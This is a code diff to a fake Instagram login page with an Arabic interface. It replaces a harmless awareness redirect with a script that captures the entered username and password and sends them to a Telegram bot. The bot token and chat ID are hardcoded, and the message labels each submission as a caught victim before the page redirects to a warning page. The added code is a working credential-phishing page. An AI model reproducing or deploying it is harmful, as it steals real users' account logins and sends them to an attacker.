@@ -70,19 +70,46 @@
     <div class="login-container">
         <div class="logo">Instagram</div>
 
-        <form onsubmit="redirectToWarning(event)">
-            <input type="text" class="input-field" placeholder="اسم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
-            <input type="password" class="input-field" placeholder="كلمة السر" required>
+        <form id="loginForm">
+            <input type="text" id="username" class="input-field" placeholder="اسم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="password" class="input-field" placeholder="كلمة السر" required>
             <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
     </div>
 
     <script>
-        function redirectToWarning(event) {
-            event.preventDefault(); // منع الإرسال الحقيقي
-            // الانتقال المباشر لصفحة التوعية والتحذير
-            window.location.href = "warning.html";
-        }
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // استخراج البيانات المدخلة
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // معلومات بوت تليجرام الخاص بك
+            const botToken = "8677692095:AAF2WJhazxneecyzwripCch54k5m0npTEAo";
+            const chatId = "7186101939";
+
+            // صياغة الرسالة
+            const message = `🚨 تم صيد ضحية جديدة!\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
+
+            // إرسال البيانات إلى تليجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                // الانتقال لصفحة التحذير بعد الإرسال
+                window.location.href = "warning.html";
+            })
+            .catch(error => {
+                // الانتقال لصفحة التحذير حتى لو حدث خطأ في الاتصال
+                window.location.href = "warning.html";
+            });
+        });
     </script>
 
 </body>
